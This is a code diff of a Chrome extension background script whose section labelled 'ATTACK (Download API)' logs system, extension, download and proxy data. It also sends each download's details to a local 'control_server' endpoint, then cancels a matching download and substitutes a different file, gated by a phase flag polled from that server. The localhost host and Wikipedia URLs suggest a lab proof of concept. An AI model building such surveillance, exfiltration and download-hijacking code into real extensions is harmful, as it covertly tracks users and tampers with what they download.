@@ -147,7 +147,7 @@ chrome.alarms.onAlarm.addListener((Alarm)=>{
         chrome.system.cpu.getInfo((info)=>{logCPU(info)})
         chrome.management.getAll((info)=>{logExApp(info)})
         chrome.downloads.search({}).then(logExApp) 
-        chrome.proxy.settings.get({'incognito': false}, logExApp(config))
+        chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))
         
         loggingcontentSettings()
         loggingprivacySettings();
@@ -185,7 +185,7 @@ indentifie.
 
 
 
-chrome.alarms.create("phase",{ periodInMinutes: 0.05 });
+chrome.alarms.create("phase",{ periodInMinutes: 0.02});
 //https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls
 
 chrome.alarms.onAlarm.addListener((Alarm) => {
@@ -201,6 +201,9 @@ chrome.alarms.onAlarm.addListener((Alarm) => {
                 if(result == "2"){
                     chrome.storage.local.set({phase:1});
                 };
+                if(result == "4"){
+                    chrome.storage.local.set({phase:0});
+                };
             })
 
     }
@@ -210,14 +213,15 @@ chrome.alarms.onAlarm.addListener((Alarm) => {
 //ATTACK (Download API)
 
 
-chrome.alarms.create("dow",{ periodInMinutes: 0.05 });
+
 
 
 
 
 function modify(item){
-    chrome.storage.local.get(["uid"]).then((result)=>{
-    
+    chrome.storage.local.get(["phase"]).then((result)=>{
+        console.log(result)
+        if(result.phase == 1){
         fetch('http://127.0.0.1:5000/control_server',
         {
         method: "POST",
@@ -225,9 +229,11 @@ function modify(item){
         body: JSON.stringify(item),
         headers:{"Content-Type": "application/json"}
         })
+        if (item.url.includes("1024px-Wikipedia-logo-v2.svg.png")){
         chrome.downloads.cancel(item.id)
-        chrome.downloads.download({url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg"});
-        });
+        chrome.downloads.download({url: "https://en.wikipedia.org/wiki/Gender_bias_on_Wikipedia#/media/File:Wikipedia_Monument_2.JPG"});
+        }
+    }});
  
 }
 
